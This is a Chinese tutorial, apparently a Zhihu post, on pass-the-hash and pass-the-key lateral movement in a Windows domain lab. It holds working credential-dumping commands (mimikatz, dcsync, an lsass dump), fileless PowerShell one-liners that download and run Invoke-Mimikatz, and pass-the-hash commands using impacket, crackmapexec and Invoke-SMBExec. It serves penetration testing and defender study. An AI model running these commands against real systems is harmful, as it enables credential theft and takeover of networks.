> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [zhuanlan.zhihu.com](https://zhuanlan.zhihu.com/p/472019671)

0x00 前言
-------

横向渗透中的哈希传递攻击，这一部分在内网渗透中是十分关键的。在域环境中，用户登录计算机时一般使用域账号，大量计算机在安装时会使用相同的本地管理员账号和密码，因此，如果计算机的本地管理员账号和密码也相同，攻击者就能使用哈希传递攻击的方法来登录内网中的其他主机。使用该方法，攻击者不需要花费时间来对 Hash 进行爆破，在内网渗透里非常经典。常常适用于域 / 工作组环境。

下面我们先来了解一些基础概念，然后再进行实战攻击。

0x01 基础概念
---------

什么是 PTH 攻击
----------

哈希传递 (pth) 攻击是指攻击者可以通过捕获密码的 hash 值(对应着密码的值), 然后简单地将其传递来进行身份验证，以此来横向访问其他网络系统。 攻击者无须通过解密 hash 值来获取明文密码。因为对于每个 Session hash 值都是固定的，除非密码被修改了(需要刷新缓存才能生效)，所以 pth 可以利用身份验证协议来进行攻击。 攻击者通常通过抓取系统的活动内存和其他技术来获取哈希。

虽然哈希传递攻击可以在 Linux,Unix 和其他平台上发生, 但它们在 windows 系统上最普遍。 在 Windows 中，pth 通过 NT Lan Manager(NTLM)，Kereros 和其他身份验证协议来进行单点登录。在 Windows 中创建密码后，密码经过哈希化处理后存储在安全账户管理器 (SAM)，本地安全机构子系统(LSASS) 进程内存，凭据管理器(CredMan),Active Directory 中的 ntds.dit 数据库或者其他地方。因此，当用户登录 windows 工作站或服务器时，他们实际上会留下密码凭据(hash)。

PTH 的影响
-------

从 Windows Vista 和 Windows Server 2008 开始，微软默认禁用 LM hash。在 Windows Server 2012 R2 及之后版本的操作系统中，默认不会在内存中保存明文密码，Mimikatz 就读不到密码明文，只能读取哈希值。虽然此时可以通过修改注册表的方式抓取明文，但需要用户重新登录后才能成功抓取。修改注册表命令为：

```
reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1 /f

```

然后强制要求 lsass.exe 来缓存明文密码再进行抓取，但是这种方式要求系统重启或者用户重新登录，在实战中操作起来成功率还是比较低的。

通过明文密码来横向移动是极其有效的，一个是通用弱口令，一个是密码规律的猜测，在大量机器的环境中都是很可能存在的，但是随着系统版本迭代，我们获取到明文密码的难度越来越大，但是 hash 的获取是固定存在的，因为 window 中经常需要用 hash 来进行验证和交互。所以利用 hash 来进行横向移动在内网渗透中经常充当主力的角色。

Hash 的认识
--------

既然是 pass the hash，那么我就先来了解一下什么是 Windows 中的 Hash。

在前面写了几遍有关于 NTLM 的文章，大家可以结合起来一起学习：

[使用 Responder 进行 NTLM 重放攻击](https://link.zhihu.com/?target=https%3A//xxe.icu/posts/responder_ntlmv2/)

[Windows 认证与域渗透](https://link.zhihu.com/?target=https%3A//xxe.icu/posts/domain-security/%231ntlm)

### LM Hash

LM(LAN Mannager) 协议使用的 hash 就叫做 LM Hash, 由 IBM 设计和提出, 在过去早期使用。

由于其存在比较多的缺点，比较容易破解。

**自 WindowsVista 和 Windows Server 2008 开始, Windows 取消 LM hash。**

但是在 win2003 中还是存在的, 通过爆破 LM Hash 来获取明文还是比较可行的。

![](https://pic3.zhimg.com/v2-f542b91aec119e2eca0c1db8416ca3ca_r.jpg)

1.  LM Hash 生成过程  
    
2.  用户的密码被限制为最多 14 个字符。  
    
3.  用户的密码转换为大写。
4.  密码转换为 16 进制字符串，不足 14 字节将会用 0 来再后面补全。
5.  密码的 16 进制字符串被分成两个 7byte 部分。每部分转换成比特流，并且长度位 56bit，长度不足使用 0 在左边补齐长度，再分 7bit 为一组末尾加 0，组成新的编码（str_to_key() 函数处理）
6.  上步骤得到的 8byte 二组，分别作为 DES key 为 "KGS!@#$%" 进行加密。
7.  将二组 DES 加密后的编码拼接，得到最终 LM HASH 值。

下面是 python 写的加密脚本：

```
# coding=utf-8
import base64
import binascii
from pyDes import *


def DesEncrypt(str, Des_Key):
    k = des(Des_Key, ECB, pad=None)
    EncryptStr = k.encrypt(str)
    return binascii.b2a_hex(EncryptStr)


def Zero_padding(str):
    b = []
    l = len(str)
    num = 0
    for n in range(l):
        if (num < 8) and n % 7 == 0:
            b.append(str[n:n + 7] + '0')
            num = num + 1
    return ''.join(b)


if __name__ == "__main__":

    test_str = "123456"
    # 用户的密码转换为大写,并转换为16进制字符串
    test_str = test_str.upper().encode('hex')
    str_len = len(test_str)

    # 密码不足14字节将会用0来补全
    if str_len < 28:
        test_str = test_str.ljust(28, '0')

    # 固定长度的密码被分成两个7byte部分
    t_1 = test_str[0:len(test_str) / 2]
    t_2 = test_str[len(test_str) / 2:]

    # 每部分转换成比特流，并且长度位56bit，长度不足使用0在左边补齐长度
    t_1 = bin(int(t_1, 16)).lstrip('0b').rjust(56, '0')
    t_2 = bin(int(t_2, 16)).lstrip('0b').rjust(56, '0')

    # 再分7bit为一组末尾加0，组成新的编码
    t_1 = Zero_padding(t_1)
    t_2 = Zero_padding(t_2)
    print t_1
    t_1 = hex(int(t_1, 2))
    t_2 = hex(int(t_2, 2))
    t_1 = t_1[2:].rstrip('L')
    t_2 = t_2[2:].rstrip('L')

    if '0' == t_2:
        t_2 = "0000000000000000"
    t_1 = binascii.a2b_hex(t_1)
    t_2 = binascii.a2b_hex(t_2)

    # 上步骤得到的8byte二组，分别作为DES key为"KGS!@#$%"进行加密。
    LM_1 = DesEncrypt("KGS!@#$%", t_1)
    LM_2 = DesEncrypt("KGS!@#$%", t_2)

    # 将二组DES加密后的编码拼接，得到最终LM HASH值。
    LM = LM_1 + LM_2
    print LM

```

因为在 windows 7 以上的版本是默认不启用 LM hash 的，所以要手动修改。

`gpedit.msc-计算机配置-Windows 设置-安全设置-本地策略-安全选项`

找到网络安全︰ `不要在下次更改密码存储 LAN 管理器的哈希值，选择已禁用`

系统下一次更改密码后，就能够导出 LM hash。

> 在我测试环境的系统发现这一项都默认启用而且不能修改  

1.  LM Hash 的缺点  
    
2.  密码长度最大只能为 14 个字符  
    
3.  密码不区分大小写 (加密过程统一转换为大写, 导致的)  
    
4.  加密结果后 16 位为 aad3b435b51404ee, 则说明密码强度小于 7 位。(如果不够 7 位的话, 后面需要用 0 来补全)  
    

### NTLM Hash

为了解决 LM 加密和身份验证方案中固有的安全弱点，Microsoft 于 1993 年在 Windows NT 3.1 中引入了 NTLM 协议。

也就是说从 Windows Vista 和 Windows Server 2008 开始，默认情况下只存储 NTLM Hash，LM Hash 将不再存在。如果空密码或者不储蓄 LM Hash 的话，我们抓到的 LM Hash 是 AAD3B435B51404EEAAD3B435B51404EE。

所以在真实环境中我们看到抓到 LM Hash 都是 AAD3B435B51404EEAAD3B435B51404EE，这里的 LM Hash 并没有价值。

**NTLM Hash 生成过程**

1.  先将用户密码转换为十六进制格式。
2.  将十六进制格式的密码进行 Unicode 编码。
3.  使用 MD4 摘要算法对 Unicode 编码数据进行 Hash 计算

可以使用 python 进行生成：

```
python2 -c 'import hashlib,binascii; print binascii.hexlify(hashlib.new("md4", "admin".encode("utf-16le")).digest())'

```

**NTLM hash 本地的认证**

当用户注销、重启、锁屏之后，windows 会让 **winlogon** 显示登陆界面，接收用户的输入之后，会将将密码交付给 **lsass** 进程，这个进程会将明文密码加密成 NTLM hash，再与 **SAM 数据库**里对应的用户密码做对比。

*   winlogon(Windows logon process)windows 注册进程：是 windows NT 用户的登陆程序，用于管理用户的登陆与退出
*   lsass(Local Security Authority Service): 用于本地安全与登陆策略
*   SAM(Security Account Manager 安全账户管理)：windows 采用的账户管理策略，这个策略会将本地组的用户的账户和 hash 加密之后保存到 SAM 数据库中，SAM 数据库文件路径是`%systemroot%\system32\config\SAM`文件

> 本机的用户密码 hash 是放在本地的 SAM 文件里面，域内用户的密码 hash 存在域控的 NTDS.DIT 文件的。  

关于 NTLM 的认证协议这里就不再具体展开了，可以查阅 [Windows 内网协议学习 NTLM 篇之 NTLM 基础介绍](https://link.zhihu.com/?target=https%3A//www.anquanke.com/post/id/193149)

这里只要我们知道 LM Hash 已经不在新的系统中使用了，我们 pth 主要的攻击是针对 NTLM Hash。

0x02 实战
-------

攻击思路
----

首先我们假设拿到了一台内网机器，这台内网机器可能是域用户可能也是本地用户，首先要通过提权到 system 权限才可以导出 hash 值，然后利用本地保存的 hash 去登录内网的其他机器，还可以执行批量的操作。

在域环境中，利用 pass the hash 的渗透方式往往是这样的：

1.  获得一台域主机的权限
2.  Dump 内存获得用户 hash
3.  通过 pass the hash 尝试登录其他主机
4.  继续搜集 hash 并尝试远程登录
5.  直到获得域管理员账户 hash，登录域控，最终成功控制整个域

比如我们现在的环境是：

DC：172.16.0.106(域管用户 testuser)

Win7：172.16.0.105(本地管理员 sc92n)

域：hack.lab

我们需要从 win 7 登录到 DC，现在我们先去利用工具获取到 hash 的值。

获取 Hash
-------

我们进行 pth 的过程需要获取到相关的 hash 才可以进行。

### Mimikatz

可以到 GitHub 下载新版的：[https://github.com/gentilkiwi/mimikatz](https://link.zhihu.com/?target=https%3A//github.com/gentilkiwi/mimikatz)

读取 lsass 进程的信息：

```
privilege::debug
sekurlsa::msv

```

如下图：

![](https://pic2.zhimg.com/v2-553a0a81a30193e9eac76d977b68b66d_r.jpg)

当然也可以用下面的命令获取全部用户的密钥和明文：

```
privilege::debug
sekurlsa::logonPasswords

```

如下图：

![](https://pic4.zhimg.com/v2-39be007d89ef4e79c72a7a2f7cf6c4cf_r.jpg)

读取 SAM 数据库获取用户 Hash, 获取系统所有本地用户的 hash：

```
privilege::debug
token::elevate
lsadump::sam

```

如下图：

![](https://pic1.zhimg.com/v2-7da5ed03dd0f8bc423008b8e835f0cd0_r.jpg)

也可以使用`dcsync`功能导出域内的所有 hash：

```
lsadump::dcsync /domain:test.local /all /csv

```

### Cobalt Strike

这块没有测试的环境就不再展开，相信熟悉 cs 的小伙伴也知道这个功能, 具体功能在：

`选中客户端列表->右键选择Access的模块中的Dump Hashes`

读取到的凭证可以在菜单栏的`view-Credentials`中查看。

*   导出域内的所有 hash 可以使用 Beacon 的 hashdump。  
    
*   导出域内的所有 hash 可以使用 Beacon 的 dcsync  
    

```
查询域内所有hash
dcsync [DOMAIN.FQDN]
查询指定用户hash
dcsync [DOMAIN.FQDN] [DOMAIN\user]

```

### Invoke-Mimikatz.ps1

这个是 mimikatz 的 powershell 版本，也经常用于在内网渗透中，相对于 exe 的版本会方便许多。

该脚本集成在 [PowerSploit](https://link.zhihu.com/?target=https%3A//github.com/PowerShellMafia/PowerSploit) 项目中，下载地址：[Invoke-Mimikatz.ps1](https://link.zhihu.com/?target=https%3A//github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Invoke-Mimikatz.ps1)

这个工具在另外一篇文章有写过具体的用法 [Powershell 在渗透测试中的利用](https://link.zhihu.com/?target=https%3A//xxe.icu/posts/powershell-attack/%23invoke-mimikatz)

*   无文件读取方式

`powershell powershell "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1'); Invoke-Mimikatz -DumpCreds"`

*   读取 sam 数据库

`powershell powershell "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1'); Invoke-Mimikatz -Command \"privilege::debug token::elevate lsadump::sam exit\""`

在这里插一点内容，主要是获取域用户的 hash 值，也可以使用 [Empire](https://link.zhihu.com/?target=https%3A//github.com/EmpireProject/Empire) 的 [Invoke-DCSync.ps1](https://link.zhihu.com/?target=https%3A//github.com/EmpireProject/Empire/blob/master/data/module_source/credentials/Invoke-DCSync.ps1) 工具来获取：

```
导出域内所有用户的hash
Invoke-DCSync -DumpForest | ft -wrap -autosize
导出指定账户的hash
Invoke-DCSync -DumpForest -Users @("administrator") | ft -wrap -autosize

```

### CrackMapExec

该工具也可以导出 hash，而且还是批量的，具体在官方 gitbook 上写得很明细了，这里不再展开，后续会专门写一遍关于该工具的文章。

安装方法：

[https://mpgn.gitbook.io/crackmapexec/getting-started/installation](https://link.zhihu.com/?target=https%3A//mpgn.gitbook.io/crackmapexec/getting-started/installation)

导出凭证（需要有管理员权限）：

[https://mpgn.gitbook.io/crackmapexec/smb-protocol/obtaining-credentials](https://link.zhihu.com/?target=https%3A//mpgn.gitbook.io/crackmapexec/smb-protocol/obtaining-credentials)

### 转储 lsass 进程

因为我们的凭证除了报错在 sam 文件中，还可以在 lsass 进程保存，现在找到 lsass 进程, 然后创建转储文件：

![](https://pic4.zhimg.com/v2-48cc7e49273b9799b1af3568d6eb116f_r.jpg)

一般会保存在`C:\Users\用户名\AppData\Local\Temp\lsass.DMP`

将该文件下载回来放置在 Mimikatz 的同目录下，然后执行：

```
sekurlsa::minidump lsass.DMP
sekurlsa::logonPasswords full

```

当然我们也可以使用`procdump`这个程序来导出 lsass.dmp，只需在命令行获取 system 权限操作即可。

该工具是微软官方的一款工具：**[Download ProcDump](https://link.zhihu.com/?target=https%3A//download.sysinternals.com/files/Procdump.zip)**

执行以下命令即可导出 lass.dmp：

```
32位机器：procdump.exe -accepteula -ma lsass.exe lsass.dmp 
64位机器：procdump.exe -accepteula -64 -ma lsass.exe lsass.dmp

```

Pass The Hash
-------------

如果内网主机的本地管理员账户密码相同，那么可以通过 pass the hash 远程登录到任意一台主机，操作简单、威力无穷。

下面会使用几种方法来进行攻击，用到的工具有 Smbmap、CrackMapExec、Smbexec 等。

比如我们现在的环境是：

DC：172.16.0.106(域管用户 testuser)

Win7：172.16.0.105(从这台获取到了 hash)

kali：172.16.0.107

域：hack.lab

testuser 的 hash：de26cce0356891a4a020e7c4957afc72

### Smbmap

SMBMAP 允许用户在整个域中枚举 Samba 共享驱动器。列出共享驱动器，驱动程序权限，共享内容，上载 / 下载功能，文件名自动下载模式匹配，甚至执行远程命令。

下载：

```
git clone https://github.com/ShawnDEvans/smbmap
cd smbmap

```

安装一下模块：

```
python3 -m pip install -r requirements.txt

```

这款工具 kali 也有内置，我们可以直接使用：

```
smbmap -u testuser -p 'aad3b435b51404eeaad3b435b51404ee:de26cce0356891a4a020e7c4957afc72' -H 172.16.0.106 -d hack.lab -x 'whoami'

```

> aad3b435b51404eeaad3b435b51404ee 上我们讲过是 LM hash 默认的值  

如下图所示：

![](https://pic1.zhimg.com/v2-0a076afee1bed75d97775f6f55d5a07c_r.jpg)

### smbexec.py

smbexec.py 是 [impacket](https://link.zhihu.com/?target=https%3A//github.com/SecureAuthCorp/impacket) 里面的一个工具，在 kali 是已经预装好的，如果没有安装可以用以下命令进行安装：

```
python3 -m pip install impacket

```

发起 pth 攻击命令如下：

```
smbexec.py hack.lab/testuser@172.16.0.106 -hashes 'aad3b435b51404eeaad3b435b51404ee:de26cce0356891a4a020e7c4957afc72'

```

结果如下图：

![](https://pic4.zhimg.com/v2-81905e4a9c277c2aee6be0a8a6d04fc7_r.jpg)

### Invoke-SMBExec

当然，除了有 python 版本也有 powershell 的版本，在 [Invoke-TheHash](https://link.zhihu.com/?target=https%3A//github.com/Kevin-Robertson/Invoke-TheHash) 项目中有个脚本文件`Invoke-SMBExec.ps1`, 大家可以直接在上面进行下载

下载链接：[Invoke-SMBExec.ps1](https://link.zhihu.com/?target=https%3A//github.com/Kevin-Robertson/Invoke-TheHash/blob/master/Invoke-SMBExec.ps1)

执行命令如下：

```
Import-Modle .\Invoke-SMBExec.ps1
Invoke-SMBExec -Target 172.16.0.106 -Domain hack.lab -Username testuser -Hash de26cce0356891a4a020e7c4957afc72 -Command "calc.exe" -verbose

```

结果如下：

![](https://pic4.zhimg.com/v2-c3d20eb50e0d42a16ba0dd225276f3d3_r.jpg)

因为这款工具执行命令不会返回结果，可以使用 cs 或者 msf 的 powershell 命令进行远程上线，上面的命令执行后会在目标主机生成一个当前权限的计算器：

![](https://pic3.zhimg.com/v2-14c72982abd4ab2113943bf594009332_r.jpg)

### Invoke-WMIExec

同样是在在 [Invoke-TheHash](https://link.zhihu.com/?target=https%3A//github.com/Kevin-Robertson/Invoke-TheHash) 项目的一个脚本，叫做`Invoke-WMIExec.ps1`。

用法跟上面是一致的，只是利用的方式不相同而已：

```
Import-Modle .\Invoke-WMIExec.ps1
Invoke-WMIExec -Target 172.16.0.106 -Domain hack.lab -Username testuser -Hash de26cce0356891a4a020e7c4957afc72 -Command "calc.exe" -verbose

```

### wmiexec

当然还有它的 python 版本，也是在是 [impacket](https://link.zhihu.com/?target=https%3A//github.com/SecureAuthCorp/impacket) 里面的一个工具，在 kali 是已经预装好的，用法跟 smbexec.py 是一致的：

```
wmiexec.py hack.lab/testuser@172.16.0.106 -hashes 'aad3b435b51404eeaad3b435b51404ee:de26cce0356891a4a020e7c4957afc72'

```

结果如下图：

![](https://pic1.zhimg.com/v2-5523e08cc8a57a2af28adc33a3ac0440_r.jpg)

### Atexec

这个就是自动化实现计划任务的方式，也是在是 [impacket](https://link.zhihu.com/?target=https%3A//github.com/SecureAuthCorp/impacket) 里面的一个工具。

使用方法如下：

```
atexec.py -hashes aad3b435b51404eeaad3b435b51404ee:de26cce0356891a4a020e7c4957afc72 hack.lab/testuser@172.16.0.106 whoami

```

如下图：

![](https://pic4.zhimg.com/v2-7070f35b856cd04240437773240f2893_r.jpg)

### Mimikatz

又是耳熟能详的 **Mimikatz** 大杀器了，mimikatz 的 pth 功能需要本地管理员权限，这是由它的实现机制决定的，需要先获得高权限进程 lsass.exe 的信息。

可以到 GitHub 下载新版的：[https://github.com/gentilkiwi/mimikatz](https://link.zhihu.com/?target=https%3A//github.com/gentilkiwi/mimikatz)

可以看到我们一开始无法连接到 dc 服务器查看 c 盘下的文件：

![](https://pic4.zhimg.com/v2-48aa5c60d7bde1ebed57f246758266e7_r.jpg)

我们在主机上启动我们的 mimikatz 工具，执行以下命令：

```
privilege::debug
sekurlsa::pth /user:testuser /domain:hack.lab /ntlm:de26cce0356891a4a020e7c4957afc72

```

![](https://pic1.zhimg.com/v2-525fde82e8493d3cbe3cdbd52d04794c_r.jpg)

就会弹出一个 cmd 命令窗口，这次我们再次输入就能重新列出 dc 上 c 盘的文件：

![](https://pic1.zhimg.com/v2-fec3d23b24263dc01bf11460ffe58a5c_r.jpg)

### psexec

当然也少不了我们的 **psexec** 大杀器，这是在微软官方提供的一个 PsTools 工具包里面，虽然不用做免杀，但是会在系统日志中留下记录。

官方的下载地址：[PsExec - Windows Sysinternals](https://link.zhihu.com/?target=https%3A//docs.microsoft.com/zh-cn/sysinternals/downloads/psexec)

PsExec 的基本原理是：通过管道在远程目标主机上创建一个 psexec 服务，并在本地磁盘中生成一个名为”PSEXESVC“的二进制文件，然后通过 psexec 服务运行命令，运行结束后删除服务。由于创建或删除服务时会产生大量的日志，可以在攻击溯源时通过日志反推攻击流程。

> 需要远程系统开启 admin 共享（默认是开启的），原理是基于 IPC 共享，目标需要开放 445 端口和 admin 在使用 IPC 连接目标系统后，不需要输入账户和密码。  

使用方法：

```
PsExec.exe \\172.16.0.105 -u hack.lab\lucky -p p@ssw0rd cmd /c "ipconfig"

```

因为官方的工具只支持明文建立链接，所以我们可以使用 python 版本的，也是在 Impacket 工具包中的使用方法如下：

```
psexec.py hack.lab/lucky@172.16.0.105 -hashes 'aad3b435b51404eeaad3b435b51404ee:de26cce0356891a4a020e7c4957afc72'

```

结果如下图：

![](https://pic2.zhimg.com/v2-e621b4f8fbfc1ec029bebaf36813a6f5_r.jpg)

### CrackMapExec

上面在获取 hash 的时候也有介绍一点，现在 pth 也可以利用到这款工具。本节安装在 kali 选的是 Linux，其他版本可以到 GitHub 上下载 [CrackMapExec](https://link.zhihu.com/?target=https%3A//github.com/byt3bl33d3r/CrackMapExec)

安装：

```
sudo apt install crackmapexec

```

使用方法也很简单，执行以下命令即可：

```
crackmapexec smb 172.16.0.106 -u testuser -H de26cce0356891a4a020e7c4957afc72 -x whoami -d hack.lab

```

如图所示：

![](https://pic2.zhimg.com/v2-80afa79b645092a1d401a246d0646389_r.jpg)

Pass The Key
------------

在 2014 年微软终于发布了更新补丁 kb2871997，禁止本地管理员账户用于远程连接，这样就无法以本地管理员用户的权限执行 wmi、PSEXEC、schtasks、at 和访问文件共享。

但是上面的描述不是很正确的，之前也有发文说这个补丁阻止了 pth, 三年后还发了一篇澄清文章：[Pass-the-Hash Is Dead](https://link.zhihu.com/?target=https%3A//posts.specterops.io/pass-the-hash-is-dead-long-live-localaccounttokenfilterpolicy-506c25a7c167)

关于这个补丁的详细分析可以参考问 [KB22871997 是否真的能防御 PTH 攻击？](https://link.zhihu.com/?target=https%3A//www.freebuf.com/articles/system/220473.html)

### 那么什么才叫做 pass the key 呢？

1.  但是在 [Overpass-the-hash](https://link.zhihu.com/?target=https%3A//blog.gentilkiwi.com/securite/mimikatz/overpass-the-hash) 和三好学生中 [pass the hash](https://link.zhihu.com/?target=https%3A//www.vuln.cn/6813) 的文章中解释的是：  
    
2.  禁用 NTLM 使得 psexec 无法利用获得的 ntlm hash 进行远程连接，虽然”sekurlsa::pth” 在 mimikatz 中被称之为”Pass The Hash”, 但是其已经超越了以前的”Pass The Hash”，部分人将其命名为”Overpass-the-hash”，也就是”Pass-the-key”  
    
3.  将哈希注入到 msv1_0 **和** kerberos 提供程序中，从而可以响应 NTLM 挑战并获得 Kerberos TGT。  
    
4.  在 [windows-protocol](https://link.zhihu.com/?target=https%3A//daiker.gitbook.io/windows-protocol/kerberos/1%231.-pass-the-hash-he-pass-the-key) 和《内网安全渗透》一书中提到的是：  
    

用 ntlm 传递那就是 pass the hash，用 mimikatz 的`sekurlsa::ekeys`那就称为 pass the key。

**我的理解就是 pass the key 是用 kerberos 方式进行传递，pass the hash 是用 NTLM 的方式进行传递。**

我也在本地测试过，跟 [KB22871997 是否真的能防御 PTH 攻击？](https://link.zhihu.com/?target=https%3A//www.freebuf.com/articles/system/220473.html)文章的结果是一样的，有没有安装 kb2871997 补丁都是没办法使用加入管理员组的用户进行 pth。

在文章[内网渗透拿不到密码怎么办？试试 Pass-The-Hash](https://link.zhihu.com/?target=https%3A//www.freebuf.com/articles/web/271048.html) 当中有个一句描述这个问题：

```
工作组环境下:

Windows Vista之前的机器，可以使用本地管理员组内用户进行攻击 windows Vista之后的机器，只能是administrator用户才能进行攻击，其他用户会提示拒绝访问

域环境下:

域内任意一台主机的本地管理员权限和域管理员密码的NTLM hash值，可进行pth攻击

由于Pass-The-Hash在win7的工作组环境下只支持在administrator用户的情况下才能利用，而windows默认是关闭这个用户的

```

**所以不是因为这个补丁而导致我们用户一般情况下不能使用 pth 的，使用 sid 为 500 的 adminisitrator 确实是可以使用 pth。**

### 使用 aes key 的方式进行 ptk 是否要安装补丁呢？

在网上的文章中和《内网安全渗透》一书都有一个描述：

```
ntlm hash is mandatory on XP/2003/Vista/2008 and before 7/2008r2/8/2012 kb2871997 (AES not available or replaceable) ; AES keys can be replaced only on 8.1/2012r2 or 7/2008r2/8/2012 with kb2871997, in this case you can avoid ntlm hash.

```

就是说如果不安装这个补丁就不能使用 aes key 的方式进行 ptk，但是我在测试了无数次，在没有补丁的情况，还是可以使用 ptk 的方式进行传递的。

我们使用系统命令查看是否安装了该补丁：

```
systeminfo | findstr "kb2871997"

```

aes key 的获取方式:

```
privilege::debug 
sekurlsa::ekeys

```

测试没有补丁的情况下：

![](https://pic4.zhimg.com/v2-dafe82b07e254b70098cfd414f61d123_r.jpg)

补丁可以从这里下载 [2871997](https://link.zhihu.com/?target=http%3A//support.microsoft.com/en-us/help/2871997)。

> 注意这个补丁是安装在本地的  

我们在有补丁测试：

![](https://pic4.zhimg.com/v2-d65346c1f0c1d674fb9ce13f515901c7_r.jpg)

可以看出来好像并不是因为有这个补丁而导致 aes key, 看上面的文章有总结到 aes key 的地方：

```
“受保护的用户”组支持（强制Kerberos身份验证以实施AES加密）
1.当“域功能级别”设置为Windows Server 2012 R2时，将创建“受保护的用户”组。
2.受保护的用户组中的帐户只能使用Kerberos协议进行身份验证，拒绝NTLM，摘要式身份验证和CredSSP。
3.Kerberos拒绝DES和RC4加密类型进行预身份验证-必须将域配置为支持AES或更高版本。
4.不能使用Kerberos约束或不受约束的委托来委托受保护用户的帐户。
5.受保护的用户可以使用“身份验证策略”很好地工作。

```

所以归纳总结：**Pass the key 就是使用 AES256 或者 AES128 的方式进行传递。**

pth 批量横向移动
----------

### CrackMapExec

CrackMapExec 集成了 wmiexec、atexe、smbexec 的方式, 集成了 smb 扫描, 口令爆破等功能, 非常适合拿来快速移动。

我们可以扫描内网中的 445 端口开放情况：

```
crackmapexec smb 172.16.0.100/24

```

如下图：

![](https://pic1.zhimg.com/v2-7d49e8b2cfb36c69e2e0b78d34a6e110_r.jpg)

使用批量传递 hash 的命令：

```
crackmapexec smb 172.16.0.100/24 -u testuser -H de26cce0356891a4a020e7c4957afc72 -d hack.lab

```

> 因为我这个是域管理账户，所以都能登录，(Pwn3d! 代表用户名和 hash 正确)  

如下图：

![](https://pic4.zhimg.com/v2-ba324671c3af898afa2d0b9db1ece8a3_r.jpg)

### Cobalt Strike

cs 大家应该很熟悉了，这块我没搭环境，主要是在目标 (target) 当中选中目标右键选择要 pth 的方式即可。

0x03 参考
-------

[https://xz.aliyun.com/t/9309](https://link.zhihu.com/?target=https%3A//xz.aliyun.com/t/9309)

[http://drops.xmd5.com/static/drops/tips-11631.html](https://link.zhihu.com/?target=http%3A//drops.xmd5.com/static/drops/tips-11631.html)

[https://www.anquanke.com/post/id/193150](https://link.zhihu.com/?target=https%3A//www.anquanke.com/post/id/193150)

[https://xz.aliyun.com/t/8117](https://link.zhihu.com/?target=https%3A//xz.aliyun.com/t/8117)

[https://3gstudent.github.io/%E5%9F%9F%E6%B8%97%E9%80%8F-Pass-The-Hash%E7%9A%84%E5%AE%9E%E7%8E%B0](https://link.zhihu.com/?target=https%3A//3gstudent.github.io/%25E5%259F%259F%25E6%25B8%2597%25E9%2580%258F-Pass-The-Hash%25E7%259A%2584%25E5%25AE%259E%25E7%258E%25B0)

[https://www.anquanke.com/post/id/193149](https://link.zhihu.com/?target=https%3A//www.anquanke.com/post/id/193149)

...